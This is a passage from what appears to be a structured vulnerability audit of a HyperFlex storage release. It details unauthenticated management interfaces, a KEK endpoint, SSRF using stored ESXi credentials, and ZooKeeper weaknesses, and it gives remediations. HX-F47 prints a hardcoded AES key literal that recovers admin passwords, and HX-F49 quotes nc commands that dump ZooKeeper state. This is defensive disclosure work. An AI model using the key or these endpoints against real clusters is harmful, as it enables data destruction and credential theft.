            "server_global": "stNonBlockingEncServer @ BSS:0x1bd0970 (shared with HX-F40)",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Same remediation as HX-F40: bind to loopback, add TLS mutual auth or token check "
            "at the Thrift dispatch layer. "
            "Additionally: add write-quorum validation requiring multiple node signatures "
            "before any DEK write is accepted, to prevent single-node key replacement attacks."
        ),
    },
    "HX-F42": {
        "title": "Unauthenticated StPlatform Thrift Interface — 80+ Cluster Management Operations Exposed",
        "severity": "CRITICAL",
        "component": (
            "storfs (storfs-core package, ELF 64-bit, ~20MB, not stripped). "
            "Class: com::storvisor::sysmgmt::StPlatformProcessor. "
            "Server: sysmgmtNonBlockingServer (TNonblockingServer, started by SysMgmt_InitInternal). "
            "Service IDL: com.storvisor.sysmgmt.StPlatform."
        ),
        "description": (
            "The main StPlatform Apache Thrift service in storfs exposes 80+ cluster management "
            "methods without any Thrift-layer authentication. The dispatchCall implementation "
            "(StPlatformProcessor::dispatchCall) routes exclusively by method name string comparison "
            "with no preceding token or credential check. Confirmed by disassembly of "
            "process_formatDisks @ 0x9947d0: the pattern is identical to the StPlatformEnc handlers "
            "(HX-F40/HX-F41) — RTTI type check, args parse, readMessageEnd, handler call, no auth. "
            "Any caller that can reach the Thrift server port can invoke any of these operations. "
            "The most destructive accessible methods include: formatDisks, shutdownCluster, "
            "deleteDatastore, deleteDatastoreSnapshots, removeNode, removeDisk, clusterUpgrade, "
            "enableZKAuth, resetZkConnectionString, setPlatformClusterAccessPolicy, "
            "setPlatformMaintenanceMode, blacklistDisks, retireDisks, unclaimDisks, "
            "revertDatastoreSnapshot, teardownNRNFS, setDataWriteThru."
        ),
        "code_evidence": {
            "binary": "storfs (ELF 64-bit, not stripped, ~20MB)",
            "confirmed_handler": "process_formatDisks @ 0x9947d0 (same auth-less pattern as HX-F40)",
            "dispatch_fn": "StPlatformProcessor::dispatchCall — string-match routing, no auth gate",
            "server_start_fn": "StartNonBlockingServer @ 0x8c27e0",
            "server_thread": "_ZL26sysmgmtNonBlockingThreadId (created by SysMgmt_InitInternal @ 0x8c1dc0)",
            "total_methods": "80+ process_* handlers in StPlatformProcessor",
            "destructive_methods": [
                "formatDisks — format all drives, destroys all data",
                "shutdownCluster — immediate cluster shutdown (DoS)",
                "deleteDatastore / deleteDatastoreSnapshots — datastore destruction",
                "deleteFiles — arbitrary file deletion",
                "removeNode / removeDisk — cluster topology modification",
                "clusterUpgrade — trigger upgrade with attacker-controlled version map",
                "enableZKAuth / resetZkConnectionString — ZooKeeper state manipulation",
                "setPlatformClusterAccessPolicy — modify cluster access policies",
                "setPlatformMaintenanceMode — partial DoS via forced maintenance",
                "blacklistDisks / retireDisks / unclaimDisks — disk eviction",
                "revertDatastoreSnapshot — rollback data to arbitrary snapshot",
                "teardownNRNFS — tear down NFS replication",
                "setDataWriteThru — toggle write-through caching",
            ],
            "read_only_methods_also_exposed": [
                "getCluster, getNodes, getDisks, getDatastores — topology enumeration",
                "getClusterStats, getCleanerStats, getEnospaceInfo — metrics leak",
                "getAboutInfo — version/build disclosure",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the StPlatform Thrift server to 127.0.0.1 only. "
            "Add pre-dispatch authentication at the TNonblockingServer level using a shared secret "
            "or mutual TLS. For write-path methods (formatDisks, deleteDatastore, etc.), require "
            "a session token from hx-auth before the handler is invoked. "
            "For cluster-level destructive operations (formatDisks, shutdownCluster, removeNode), "
            "require explicit operator confirmation via a separate signed request channel."
        ),
    },
    "HX-F43": {
        "title": "Unauthenticated Key Encryption Key (KEK) HTTP Endpoint on Port 35333",
        "severity": "CRITICAL",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/encryption. "
            "Source: diesel/code/diesel/encryption/encryption_handler.go. "
            "Struct: (*EncryptionClient). Handler registered by StartEncryptionHandler on HTTP mux."
        ),
        "description": (
            "The hxdp-connector binary listens on port 35333 and serves a Key Encryption Key (KEK) "
            "retrieval endpoint via the getKeyEncryptionKeyHandler method. The registered HTTP handler "
            "closure (getKeyEncryptionKeyHandler.func1, PC=0x9e9ec0) dispatches directly to an inner "
            "handler at 0x9e9f20 with no authentication check before executing KEK retrieval. "
            "The inner handler creates a KeyEncryptionKeyType struct (runtime.newobject), calls "
            "barcelona/adio/json.NewContextWithSkipCustom (0x8746a0) and json.UnmarshalWithCtx "
            "(0x874a20) to parse the request, then calls adcore.UnmarshalJsonToMo* (0x9884a0) to "
            "serialize and return the KEK. There is no Authorization header read, no JWT token "
            "validation, and no session check at any point in this dispatch chain. "
            "The baseHandler method (PC=0x9e9ca0) is a 10-instruction value-packing stub that "
            "immediately returns; it is not an auth middleware. "
            "The apollo/base.appHandler.HandleWithAuth function is present in the binary (JWT "
            "validation via jwt/v4 library) but is not wired to this handler. "
            "Any unauthenticated caller that can reach port 35333 can retrieve the cluster KEK."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 35333,
            "handler_method": "(*EncryptionClient).getKeyEncryptionKeyHandler @ PC=0x9e9b40",
            "registered_closure": "getKeyEncryptionKeyHandler.func1 @ PC=0x9e9ec0",
            "inner_dispatch": "anonymous inner handler @ 0x9e9f20 (called from func1 with no auth check)",
            "call_sequence": [
                "0x9e9f50: runtime.newobject (allocate KeyEncryptionKeyType struct)",
                "0x9e9fa0: barcelona/adio/json.NewContextWithSkipCustom @ 0x8746a0 (request parse context)",
                "0x9e9fc0: barcelona/adio/json.UnmarshalWithCtx @ 0x874a20 (unmarshal request JSON)",
                "0x9e9ff5: barcelona/adcore.UnmarshalJsonToMo* @ 0x9884a0 (serialize KEK response)",
            ],
            "auth_check": "NONE — no Authorization header read, no JWT parse, no middleware gate",
            "baseHandler_confirmed_stub": (
                "baseHandler @ 0x9e9ca0: 10 instructions, saves 6 args to stack, "
                "packs rsi+r8 into rax+rbx, immediate ret — value-packing stub, not auth middleware"
            ),
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth present in binary "
                "(jwt/v4 RSA validation via jwt.SigningMethodRSA) but not called from this handler chain"
            ),
            "kek_type_descriptor": "KeyEncryptionKeyType @ 0xfe1900 (struct, size confirmed by newobject call)",
            "start_handler_fn": "StartEncryptionHandler @ PC=0x9e9ae0 (thin wrapper, no auth setup)",
            "pclntab_source": (
                "Function PCs confirmed via Go 1.23 pclntab (magic=0xfffffff1, "
                "plain null-terminated funcnametab, textStart=0x401000)"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Gate the :35333 KEK endpoint with mutual TLS client certificate authentication "
            "or require a signed bearer token (using the existing jwt/v4 RSA infrastructure "
            "already in the binary via HandleWithAuth). "
            "Bind the listener to 127.0.0.1 only if the KEK endpoint is only needed by "
            "co-located processes. "
            "Rotate any KEK material that may have been retrieved from exposed deployments."
        ),
    },

    "HX-F44": {
        "title": "Unauthenticated SSRF + ESXi Credential Exfiltration via /st-support/* (StorvisorSupportBundle)",
        "severity": "CRITICAL",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorvisorSupportBundle. "
            "Mapped to /st-support/* with NO auth filter. "
            "web.xml: servlet-mapping present for /st-support/*, filter-mapping covers only "
            "/rest/*, /internalsupport/*, /upload/*, /v1/* — /st-support/* has zero filter coverage."
        ),
        "description": (
            "StorvisorSupportBundle handles /st-support/* with no authentication filter in the "
            "Servlet filter chain. The servlet accepts a ?host=<ip> array parameter, constructs "
            "a HostCredentialsAccess object to read stored ESXi credentials from "
            "com/storvisor/sysmgmt/EsxCredential (username and password fields), then calls "
            "WebDownloader.getStream(url_with_host_param, username, password) using those credentials "
            "against the attacker-supplied host. The response is returned as a ZIP download. "
            "An unauthenticated attacker can: (1) supply an arbitrary host and observe whether the "
            "cluster's stored ESXi credentials are valid against attacker-controlled targets "
            "(credential harvest via SSRF), and (2) proxy the credential usage against any host "
            "reachable from the stCtlVM. "
            "The auth filter gap is structural: web.xml defines filter-mappings for /rest/*, "
            "/internalsupport/*, /upload/*, and /v1/* only. The /st-support/* path is never covered."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorvisorSupportBundle",
            "url_pattern": "/st-support/*",
            "credential_source": "HostCredentialsAccess -> EsxCredential.username + EsxCredential.password",
            "ssrf_sink": "WebDownloader.getStream(url_with_host_param, username, password)",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/st-support/* has no filter-mapping entry — zero auth coverage."
            ),
            "parameter": "?host=<ip> (array of host IPs, attacker-controlled)",
            "output": "ZIP of support bundle fetched from supplied host using stored ESXi credentials",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /st-support/* to the HX Connect auth filter chain in web.xml. "
            "Validate that the host parameter matches a whitelist of known cluster node IPs. "
            "Audit all stored ESXi credential usage paths for similar unfiltered servlet coverage."
        ),
    },

    "HX-F45": {
        "title": "Unauthenticated Support Bundle Command Execution via /storfs-support/* (StorfsSupportBundle)",
        "severity": "HIGH",
        "component": (
            "ROOT-1.0.0.war, deployed under HX Connect REST API (Tomcat, stCtlVM port 443). "
            "Servlet: com.storvisor.sysmgmt.rest.StorfsSupportBundle. "
            "Mapped to /storfs-support/* with NO auth filter. "
            "web.xml: same auth filter gap as /st-support/* — /storfs-support/* absent from filter-mappings."
        ),
        "description": (
            "StorfsSupportBundle handles /storfs-support/* with no authentication filter. "
            "The servlet forks /bin/storfs-support via ProcessBuilder based on the ?action= parameter: "
            "action=extended -> ProcessBuilder([\"/bin/bash\", \"-c\", \"exec /bin/storfs-support --extended > /dev/null\"]), "
            "any other value -> ProcessBuilder([\"/bin/bash\", \"-c\", \"exec /bin/storfs-support > /dev/null\"]). "
            "No request parameter reaches the shell invocation (action is only used to select the "
            "fixed command string), so there is no direct OS command injection via ?action=. "
            "However, any unauthenticated caller can: (1) trigger collection of a full HXDP support "
            "bundle (extended or light variant) by issuing requests to this endpoint, and (2) download "
            "the resulting bundle (newest .gz from /var/support/ returned as application/zip). "
            "The support bundle contains node configuration, logs, and diagnostic state that expose "
            "cluster topology, credentials paths, and internal service details. "
            "Triggering bundle generation without authentication is also a DoS vector: bundle "
            "collection consumes significant I/O and CPU on the stCtlVM."
        ),
        "code_evidence": {
            "war": "ROOT-1.0.0.war (stCtlVM, /opt/hyperflex/storfs-restapi/)",
            "servlet_class": "com.storvisor.sysmgmt.rest.StorfsSupportBundle",
            "url_pattern": "/storfs-support/*",
            "process_builder_extended": (
                "action=extended: ProcessBuilder([\"/bin/bash\", \"-c\", "
                "\"exec /bin/storfs-support --extended > /dev/null\"])"
            ),
            "process_builder_light": (
                "action=<other>: ProcessBuilder([\"/bin/bash\", \"-c\", "
                "\"exec /bin/storfs-support > /dev/null\"])"
            ),
            "output_source": "newest .gz from /var/support/ returned as application/zip",
            "injection": "NONE — action param selects fixed command string, no user data in shell args",
            "auth_filter_gap": (
                "web.xml filter-mappings: /rest/*, /internalsupport/*, /upload/*, /v1/* only. "
                "/storfs-support/* has no filter-mapping entry — zero auth coverage."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add a filter-mapping entry for /storfs-support/* to the auth filter chain in web.xml. "
            "Move support bundle generation and download behind authenticated /v1/ endpoints. "
            "Restrict ProcessBuilder invocations for system commands to roles that need them."
        ),
    },

    "HX-F46": {
        "title": "Unauthenticated Witness Service HTTP API on Port 9000 Allows Cluster Quorum Manipulation",
        "severity": "HIGH",
        "component": (
            "hxdp-connector (Go 1.23.4 binary, UPX-packed, 25MB unpacked, stripped .symtab). "
            "Module: github-hyc.scm.engit.cisco.com/starship/diesel/witness. "
            "Source: diesel/code/diesel/witness/. "
            "Server function: witness.StartWitnessServer @ PC=0xf41760. "
            "Router: barcelona/adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper)."
        ),
        "description": (
            "The diesel/witness package starts an HTTP server bound to 0.0.0.0:9000 "
            "(port constant 0x2328 written in main.main @ 0xf519cd). "
            "Routes are registered via adrest.(*RestMiddleware).HandleFunc, which is a thin wrapper "
            "around gorilla/mux.(*Route).addRegexpMatcher — it does not enforce any authentication. "
            "The handler closures (baseHandler.func2 through func12) call (*witness).setState "
            "and related witness operations directly with no token validation, no header check, "
            "and no middleware gate. The apollo/base.appHandler.HandleWithAuth JWT infrastructure "
            "present elsewhere in the binary is not wired to any witness route. "
            "Exposed endpoints and their impact: "
            "/Lock — seize the witness arbitration lock; "
            "/Unlock, /ForceUnlock — release or force-release the lock; "
            "/GetOwner — enumerate current lock owner (information disclosure); "
            "/witnessdisable (prefix match) — disable external witness, eliminating stretch cluster HA; "
            "/witnesstest (prefix match) — invoke witness connection test; "
            "/Version — witness server version disclosure; "
            "/HxCapabilities — capability state disclosure; "
            "/executeHxHealthCheck — trigger health checks; "
            "/health — service health. "
            "An unauthenticated attacker on the management network can manipulate witness state to "
            "cause split-brain scenarios in stretched HyperFlex clusters or disable HA protection."
        ),
        "code_evidence": {
            "binary": "hxdp-connector (UPX-unpacked, Go 1.23.4, stripped, 25.7MB)",
            "port": 9000,
            "bind_address": "0.0.0.0 (format string '0.0.0.0:%d' in main.main @ 0xf42376)",
            "port_assignment": "main.main @ 0xf519cd: mov qword ptr [rax + 0xa8], 0x2328 (9000 decimal)",
            "server_function": "witness.StartWitnessServer @ PC=0xf41760",
            "route_registration": "adrest.(*RestMiddleware).HandleFunc @ PC=0x8eae80 (gorilla/mux wrapper, no auth)",
            "routes_handlefunc": [
                "/health (7 bytes) -> handleHealth.func1 @ PC=0xf4c680",
                "/Lock -> handleLock.func3 @ PC=0xf4a800",
                "/Unlock -> handleUnLock.func5 @ PC=0xf48f80",
                "/ForceUnlock -> handleUnLock.func7 @ PC=0xf47700",
                "/GetOwner -> handleGetOwner.func9 @ PC=0xf464e0",
                "/Version -> handleWitnessVersion.func11 @ PC=0xf454e0",
                "/HxCapabilities -> func13 @ PC=0xf439e0",
                "/executeHxHealthCheck -> func15/func14",
            ],
            "routes_handlefuncprefix": [
                "/witnesstest (12 bytes) -> func @ PC=0xf422c8",
                "/witnessdisable (15 bytes) -> func @ PC=0xf42345",
            ],
            "witness_state_fn": "(*witness).setState @ PC=0xf38f40 (called directly from handler closures)",
            "auth_check": "NONE — adrest.HandleFunc is a pure gorilla/mux route wrapper; no JWT, no header check",
            "HandleWithAuth_unused": (
                "apollo/base.appHandler.HandleWithAuth with jwt/v4 RSA validation "
                "is present in the binary but not wired to any witness route"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Bind the witness HTTP server to 127.0.0.1 if only co-located processes need it, "
            "or gate all witness routes with the existing HandleWithAuth JWT middleware. "
            "Apply network-level ACLs blocking external access to port 9000 on stCtlVM management interfaces. "
            "Audit all adrest.HandleFuncPrefix and HandleFunc registrations for missing auth wiring."
        ),
    },

    "HX-F47": {
        "title": "Hardcoded AES-256 Symmetric Key in hx-auth Enables Offline Admin Password Recovery",
        "severity": "HIGH",
        "component": (
            "hx-auth (ELF 64-bit, Go, 9.9MB, not stripped, debug_info present). "
            "Binary path: /opt/hyperflex/storfs-packages/hx-auth (stCtlVM). "
            "Affected functions: main.loginHandler @ 0x723800, main.changeHandler @ 0x722e20, "
            "main.decrypt @ 0x7243c0."
        ),
        "description": (
            "The hx-auth service (port 8082, handles /auth, /auth/change, /auth/verify, "
            "/auth/sessionInfo, /auth/logout) uses a hardcoded 32-byte AES-256 symmetric key "
            "to decrypt the admin password stored encrypted in the deployment config. "
            "In main.loginHandler, the global main.KEY (a []byte containing the AES-encrypted password) "
            "is decrypted via main.decrypt using the embedded key literal, then compared to the "
            "submitted password with bytes.Equal. The same key is used in main.changeHandler "
            "when updating the password. "
            "Because the key is embedded in the binary, any party with read access to the hx-auth ELF "
            "can decrypt the encrypted password from /config/conf.json (or any config backup) without "
            "any additional credential. Combined with an initial access vector to the stCtlVM filesystem, "
            "this yields the admin password in plaintext. "
            "The encryption provides only obfuscation, not confidentiality — the key and algorithm "
            "are fully recoverable from the binary."
        ),
        "code_evidence": {
            "binary": "hx-auth (ELF64, Go, not stripped, /opt/hyperflex/storfs-packages/)",
            "hardcoded_key_literal": "RHGocmgN90R4ShL_WnQ5GJSgGzADV678",
            "key_length_bytes": 32,
            "algorithm": "AES-256 (key length 0x20 passed to main.decrypt)",
            "loginHandler_key_load": (
                "main.loginHandler @ 0x7238be: lea rdi, [rip + 0xa8c7a]  "
                "-> key string at VMA ~0x7c2b38; esi=0x20 (32 bytes); call main.decrypt @ 0x7243c0"
            ),
            "changeHandler_key_load": (
                "main.changeHandler @ 0x722ef3: lea rdi, [rip + 0xa9645]  "
                "-> same key literal; esi=0x20; call main.decrypt @ 0x7243c0"
            ),
            "decrypted_target": (
                "main.KEY (global []byte @ VMA 0xa66290, 0x18 bytes in .data): "
                "the AES-encrypted admin password loaded from /config/conf.json at startup"
            ),
            "comparison": (
                "main.loginHandler: bytes.Equal(decrypt(main.KEY, hardcoded_key), submitted_password) "
                "-> jne 0x7238fa (auth fail path)"
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the hardcoded symmetric key with a key derived per-deployment (e.g., from a "
            "hardware TPM, UEFI secure variable, or injected at provisioning time). "
            "Do not store the decryption key as a string literal in the binary. "
            "Prefer password hashing (bcrypt/scrypt/argon2) over reversible encryption for stored credentials."
        ),
    },

    "HX-F48": {
        "title": "isMockDevMode Dev Mode Disables Secure Flag on Auth Cookies",
        "severity": "MEDIUM",
        "component": (
            "hx-auth (ELF 64-bit, Go, 9.9MB, not stripped). "
            "Inlined function: main.isMockDevMode (DW_AT_inline=1, DWARF offset 0x9678, decl_line=47). "
            "Affected functions: main.AddCookie @ 0x723b00, main.RemoveCookie @ 0x723ca0."
        ),
        "description": (
            "main.isMockDevMode is an always-inlined Go function that checks whether the deployed "
            "configuration Mode contains the substring 'dev' (strings.Index(config.Mode, 'dev') >= 0). "
            "It is inlined into main.AddCookie (call_line=103) and main.RemoveCookie (call_line=121). "
            "When dev mode is active, both functions clear http.Cookie.Secure to false (0) before "
            "calling net/http.SetCookie, removing the Secure attribute from all auth session cookies. "
            "Without the Secure attribute, browsers transmit session cookies over plaintext HTTP, "
            "enabling session token interception on any non-TLS path. "
            "The Mode value is loaded from /config/conf.json at startup by main.readConfig. "
            "The production default is 'prod'; any value containing 'dev' (e.g., 'development', 'dev') "
            "activates the bypass. An attacker who can write /config/conf.json (via a path traversal, "
            "SSRF write, or local access) can permanently disable the Secure attribute on session cookies."
        ),
        "code_evidence": {
            "binary": "hx-auth (not stripped, debug_info, DWARF offset 0x9678 = main.isMockDevMode)",
            "inline_mechanism": "DW_AT_inline=1 (always inlined, no standalone function entry in functab)",
            "inline_site_1": {
                "location": "main.AddCookie @ 0x723b00 (inline at 0x723bdf-0x723c08, call_line=103)",
                "check": (
                    "0x723bdf: mov rax, [rip+0x381fba]  -> Mode ptr @ 0xaa5ba0\n"
                    "0x723be6: mov rdx, [rip+0x381fbb]  -> Mode len @ 0xaa5ba8\n"
                    "0x723bed: mov edi, 3  (len('dev'))\n"
                    "0x723bf5: lea rcx, [0x7c053f]  -> 'dev'\n"
                    "0x723c00: call strings.Index @ 0x5314a0\n"
                    "0x723c05: test rax, rax\n"
                    "0x723c08: jl 0x723c12  (skip if not found)\n"
                    "0x723c0a: mov byte ptr [rsp+0x90], 0  -> http.Cookie.Secure = false"
                ),
                "struct_offset": "http.Cookie starts at [rsp+0x20]; Secure bool at offset 0x70 = [rsp+0x90]",
            },
            "inline_site_2": {
                "location": "main.RemoveCookie @ 0x723ca0 (inline at 0x723dbe-0x723de3, call_line=121)",
                "effect": "same pattern: clears Secure on the expiration cookie sent to delete the session",
            },
            "mode_global": "config.Mode string ptr @ 0xaa5ba0, len @ 0xaa5ba8 (struct in .bss @ 0xaa5b60)",
            "default_mode": (
                "main.readConfig @ 0x7236ef: default Mode = 'prod' (4 bytes) "
                "when /config/conf.json omits the Mode field"
            ),
            "comparison_string": "0x7c053f: 'dev' (3 bytes, substring of 'devexpGETalgnil0' rodata pack)",
            "SetCookie_call": "net/http.SetCookie @ 0x6680e0 called after potential Secure clear",
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove the dev mode cookie security downgrade. If a non-TLS dev environment is required, "
            "gate the Secure=false behavior behind a build-time constant, not a runtime config string. "
            "Ensure /config/conf.json is not writable by processes running as non-root or by web-accessible paths."
        ),
    },

    "HX-F49": {
        "title": "ZooKeeper Port 2181 Accessible from Management Network Without Client Authentication",
        "severity": "HIGH",
        "component": (
            "ZooKeeper 3.8.1 (zookeeper_3.8.1_amd64.deb). "
            "Service: exhibitor (manages ZK). Config: /etc/hyperflex/storfs.cfg (crmZKEnsemble). "
            "Bind: eth1 (management/storage interface) since HyperFlex 5.5.1a. "
            "Auth tunable: useZKAuth in /etc/hyperflex/storfs.cfg (default: absent/false)."
        ),
        "description": (
            "ZooKeeper client port 2181 is bound to the eth1 management network interface on each "
            "stCtlVM node, making it reachable from all other nodes in the cluster management network. "
            "Client authentication is disabled by default: the setUseZkAuth.sh script must be explicitly "
            "invoked post-deploy to set useZKAuth=true in storfs.cfg, and this is not part of the "
            "default cluster bring-up procedure. "
            "Without useZKAuth, any host on the management network can open a ZK client session and "
            "perform unrestricted reads and writes across the entire ZNode tree. "
            "ZooKeeper stores cluster election state (/election), node inventory (/storvisor/nodeInventory), "
            "per-node member data (/members/<puuid>), cluster operational data (/cluster), and AAA session "
            "tokens written by the auth filter. An attacker with management network access (e.g., via "
            "a compromised HX edge node, vCenter integration credential, or CIMC interface) can: "
            "(1) enumerate all cluster node management IPs and UUIDs from /storvisor/nodeInventory; "
            "(2) read AAA session tokens from ZK to authenticate as any logged-in HyperFlex administrator; "
            "(3) manipulate /election ZNodes to trigger leader re-election, disrupting cluster I/O; "
            "(4) poison /members data to force node eviction from the storage cluster. "
            "The setup-dnat-rule.sh script installs an iptables DNAT rule redirecting local connections "
            "(127.0.0.1:2181 -> eth1_ip:2181) for backwards compatibility with tools that use localhost, "
            "confirming the intentional bind to eth1. "
            "The check_zk.sh cluster health tool demonstrates the expected access pattern: "
            "it uses 'nc <management_ip> 2181' to issue srvr/cons/dump/wchs four-letter commands "
            "and zkCli.sh to enumerate /election and /storvisor/nodeInventory from remote nodes."
        ),
        "code_evidence": {
            "bind_interface": (
                "setup-dnat-rule.sh: 'Starting 5.5.1a, ZK client port 2181 will only be bound on eth1 interface.'\n"
                "iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 2181 -j DNAT --to-destination $eth1"
            ),
            "auth_opt_in": (
                "setUseZkAuth.sh: checks grep useZKAuth=true /etc/hyperflex/storfs.cfg;\n"
                "sets useZKAuth=true in storfs.cfg only when explicitly invoked.\n"
                "No evidence of invocation in default cluster bring-up scripts."
            ),
            "remote_access_confirmed": (
                "check_zk.sh get_zk_servers(): reads crmZKEnsemble from storfs.cfg -> node management IPs;\n"
                "nc -z -w 5 $zks 2181 (liveness check from remote node);\n"
                "echo srvr | nc $zks 2181 (role query);\n"
                "echo cons | nc $zks 2181 (connection dump);\n"
                "echo dump | nc $LEADER 2181 (ephemeral node + session watches dump);\n"
                "zkCli.sh -server $zks:2181 -> ls /election; ls /storvisor/nodeInventory"
            ),
            "four_letter_whitelist": "zoo.cfg.defaults: 4lw.commands.whitelist=* (all commands enabled)",
            "zk_version": "zookeeper_3.8.1_amd64.deb (ZK 3.8.1)",
            "auth_provider_registered": (
                "zoo.cfg.defaults: authProvider.1=org.apache.zookeeper.server.auth.UUIDAuthenticationProvider\n"
                "Provider is registered but not enforced without requireClientAuthScheme — clients "
                "connecting without credentials are accepted as anonymous."
            ),
            "znode_paths_at_risk": [
                "/election — quorum leader election data (node IDs, epoch)",
                "/storvisor/nodeInventory — all cluster node management IPs and UUIDs",
                "/members/<puuid> — per-node membership and operational data",
                "/cluster — cluster-wide operational state",
                "AAA session token ZNodes — written by authfilter (path confirmed by AAAConfiguration.INSTANCE)",
            ],
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK client authentication by default: invoke setUseZkAuth.sh as part of cluster "
            "initialization, not as a post-upgrade opt-in. "
            "Restrict ZK 2181 to localhost or a dedicated ZK inter-node VLAN separate from the "
            "management network. "
            "Disable the all-commands 4LW whitelist (4lw.commands.whitelist=srvr,mntr at most). "
            "Rotate AAA session tokens on any cluster where useZKAuth was not enabled from initial deploy."
        ),
    },

    "HX-F50": {
        "title": "ZooKeeper zoo.cfg.defaults Sets skipACL=yes — ZNode ACL Enforcement Globally Disabled",
        "severity": "MEDIUM",
        "component": (
            "ZooKeeper 3.8.1 (zookeeper_3.8.1_amd64.deb). "
            "Config file: /usr/share/zookeeper/conf/zoo.cfg.defaults (Exhibitor base template). "
            "Runtime: zoo.cfg generated by Exhibitor from zoo.cfg.defaults at service start."
        ),
        "description": (
            "zoo.cfg.defaults contains skipACL=yes, which instructs the ZooKeeper server to bypass "
            "ACL evaluation on all client requests regardless of the ACLs set on individual ZNodes. "
            "This is a server-global flag: no per-ZNode ACL can override it. "
            "The consequence is that ZNode ACLs provide zero access control guarantees at runtime — "
            "any connected ZK client (authenticated or not) can read and write any ZNode in the tree. "
            "This is additive to HX-F49: even if useZKAuth=true is enabled (closing the unauthenticated "
            "access gap), ACL-based data isolation between ZK clients remains completely absent. "
            "Practical impact: a compromised storfs process, an iSCSI service, or any other ZK client "
            "on the cluster can read AAA session tokens, election data, and node inventory regardless "
            "of whatever ACLs the AAA service or cluster manager wrote on those ZNodes. "
            "skipACL=yes appears to have been set to simplify cluster bring-up (ZK ACL setup requires "
            "bootstrapping a shared secret across all nodes before first write), but the flag was never "
            "removed for production deployments."
        ),
        "code_evidence": {
            "config_line": "zoo.cfg.defaults:16: skipACL=yes",
            "config_file_path": "/usr/share/zookeeper/conf/zoo.cfg.defaults",
            "usage": (
                "Exhibitor reads zoo.cfg.defaults as its ZooKeeper configuration template. "
                "The generated zoo.cfg inherits all settings including skipACL=yes. "
                "updateZKAuthConfigs.sh appends to com.netflix.exhibitor.zoo-cfg-extra in "
                "/etc/exhibitor/exhibitor.properties — it does NOT remove skipACL=yes."
            ),
            "zk_acl_model": (
                "ZooKeeper ACL model: each ZNode has an ACL list (scheme:id:perms). "
                "skipACL=yes causes ZookeeperServer.checkACL() to return immediately without "
                "evaluating any ACL entry. Reference: ZooKeeper source DataTree.java checkACL()."
            ),
            "interaction_with_f49": (
                "Without skipACL=yes: enabling useZKAuth (HX-F49 remediation) + setting ZNode ACLs "
                "could provide per-client data isolation. "
                "With skipACL=yes: ACLs are meaningless even after auth is enabled. "
                "Both findings must be remediated together to achieve ZNode-level access control."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove skipACL=yes from zoo.cfg.defaults. "
            "After enabling client authentication (HX-F49 remediation), set ZNode ACLs on sensitive "
            "paths (/election, /storvisor, /members, AAA token paths) to restrict access to "
            "specific ZK auth identities (UUID-scheme IDs assigned per service). "
            "Test ACL enforcement before and after Exhibitor restart to confirm zoo.cfg picks up "
            "the change (skipACL removal requires ZK restart to take effect)."
        ),
    },

    "HX-F51": {
        "title": "iscsisvc Thrift Management Interface on Port 10210 Has No Authentication",
        "severity": "HIGH",
        "component": (
            "iscsisvc (ELF 64-bit, C++, 16MB, not stripped, PIE). "
            "Binary: /opt/hyperflex/hx-iscsi/iscsisvc. "
            "Service: iscsisvc.service (managed by systemd, Wants=hxIscsiMgr.service). "
            "Thrift server: IscsiSvcThriftServer wrapping IscsiSvcDispatcher. "
            "Thrift transport: TServerSocket (plain TCP, no TLS). "
            "Port: 10210 (tune default: iscsisvcListenPort=10210, iscsisvcEnabled=1). "
            "Bind: 0.0.0.0 (TServerSocket(int port) — no host parameter)."
        ),
        "description": (
            "The iscsisvc binary exposes a Thrift management interface on TCP port 10210 with no "
            "authentication on any handler. The Thrift transport is TServerSocket (plain TCP, no TLS) "
            "bound to 0.0.0.0:10210 by default. "
            "IscsiSvcDispatcher implements the IscsiSvcIf interface with the following handlers: "
            "testPing, createInitiatorGroup, modifyInitiatorGroup, deleteInitiatorGroup, "
            "createLUN, modifyLUN, deleteLUN, createTarget, modifyTarget, deleteTarget, "
            "createBulkInitiatorGroups, modifyBulkInitiatorGroups, deleteBulkInitiatorGroups, "
            "createBulkLUNs, modifyBulkLUNs, deleteBulkLUNs, createBulkTargets, modifyBulkTargets, "
            "deleteBulkTargets. "
            "Disassembly of createLUN @ 0x228520 confirms no auth check: "
            "entry reads tune[+0x1422] (fast-path flag) and jumps directly to istgt_notify_config_change "
            "or setCRMEntry (ZK write) without any credential or token validation. "
            "createInitiatorGroup @ 0x2282b0 has the identical pattern. "
            "An unauthenticated Thrift client on any network interface can: "
            "(1) create iSCSI LUNs mapped to arbitrary HyperFlex storage volumes; "
            "(2) add attacker-controlled initiator IQNs to initiator groups (granting iSCSI access); "
            "(3) delete existing LUNs and targets, destroying iSCSI connectivity for ESXi hosts; "
            "(4) enumerate active iSCSI sessions and target configuration. "
            "iSCSI config is persisted to ZooKeeper at /hxVolumesInv/istgt_conf (confirmed via "
            "iscsisvc startup: -T iscsiConfigLocation=zk -T iscsiConfigPath=/hxVolumesInv/istgt_conf). "
            "Combined with HX-F49 (ZK unauthenticated access): an attacker can also directly modify "
